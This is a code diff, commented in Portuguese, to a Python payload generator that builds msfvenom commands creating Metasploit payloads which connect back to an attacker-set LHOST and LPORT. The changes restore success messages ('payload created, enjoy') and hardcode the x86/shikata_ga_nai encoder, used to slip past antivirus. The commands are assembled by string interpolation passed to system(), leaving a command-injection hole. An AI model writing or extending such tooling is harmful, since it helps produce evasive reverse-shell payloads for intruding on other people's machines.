@@ -61,7 +61,7 @@ def gera_payloads(nome, formato, tipo=t1, ip='127.0.0.1', port='4444', local='Pa
             print(f'     {branco}[{vermelho}ATENÇÃO !!!{branco}]{vermelho}  Algum erro ocorreu no processamento'
                   f' do comando : msfvenom -p {tipo} LHOST={ip} LPORT={port} R > {local}{nome}.{form}')
         else:
-            f'     {branco}[{verde}01{branco}]{verde}  PAYLOAD CRIADO COM SUCESSO ! DIVIRTA-SE'
+            print(f'     {branco}[{verde}01{branco}]{verde}  PAYLOAD CRIADO COM SUCESSO ! DIVIRTA-SE')
         exit()
 
     if not encoder:
@@ -70,12 +70,16 @@ def gera_payloads(nome, formato, tipo=t1, ip='127.0.0.1', port='4444', local='Pa
             print()
             print(f'     {branco}[{vermelho}ATENÇÃO !!!{branco}]{vermelho}  Algum erro ocorreu no processamento'
                   f' do comando : msfvenom -p {tipo} LHOST={ip} LPORT={port} -f {formato} > {local}{nome}.{form}')
+        else:
+            print(f'     {branco}[{verde}01{branco}]{verde}  PAYLOAD CRIADO COM SUCESSO ! DIVIRTA-SE')
     else:
-        payload = system(f'msfvenom -p {tipo} LHOST={ip} LPORT={port} -e {encoder} -f {formato} > {local}{nome}.{form}')
+        payload = system(f'msfvenom -p {tipo} LHOST={ip} LPORT={port} -e x86/shikata_ga_nai -f {formato} > {local}{nome}.{form}')
         if payload == 1:
             print()
             print(f'     {branco}[{vermelho}ATENÇÃO !!!{branco}]{vermelho}  Algum erro ocorreu no processamento'
-                  f' do comando : msfvenom -p {tipo} LHOST={ip} LPORT={port} -e {encoder} -f {formato} >'
+                  f' do comando : msfvenom -p {tipo} LHOST={ip} LPORT={port} -e x86/shikata_ga_nai -f {formato} >'
                   f' {local}{nome}.{form}')
-
+        else:
+            print(f'     {branco}[{verde}01{branco}]{verde}  PAYLOAD CRIADO COM SUCESSO ! DIVIRTA-SE')
+                  
     exit()
